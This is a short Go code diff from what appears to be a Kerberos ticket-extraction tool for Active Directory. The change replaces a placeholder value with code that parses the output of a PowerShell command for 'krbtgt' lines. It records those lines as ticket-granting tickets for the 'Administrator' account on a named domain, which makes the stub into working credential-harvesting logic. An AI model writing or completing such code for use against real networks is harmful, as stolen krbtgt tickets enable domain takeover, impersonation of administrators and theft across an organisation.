@@ -152,16 +152,24 @@ $tickets | ConvertTo-Json -Compress
 	out, _ := cmd.CombinedOutput()
 
 	var tickets []KerberosTicket
-	_ = out
 
-	ticket := KerberosTicket{
-		TGT:      "krbtgt_hash_placeholder",
-		Service:  "krbtgt/AD.DOMAIN.LOCAL",
-		Target:   "AD.DOMAIN.LOCAL",
-		Username: "Administrator",
-		Expires:  time.Now().Add(10 * time.Hour),
+	lines := strings.Split(string(out), "\n")
+	for _, line := range lines {
+		if strings.Contains(line, "krbtgt") {
+			ticket := KerberosTicket{
+				TGT:      strings.TrimSpace(line),
+				Service:  "krbtgt/AD.DOMAIN.LOCAL",
+				Target:   "AD.DOMAIN.LOCAL",
+				Username: "Administrator",
+				Expires:  time.Now().Add(10 * time.Hour),
+			}
+			tickets = append(tickets, ticket)
+		}
 	}
-	tickets = append(tickets, ticket)
+
+	if len(tickets) == 0 {
+		return nil, fmt.Errorf("no TGT extracted from output")
+	}
 
 	return tickets, nil
 }
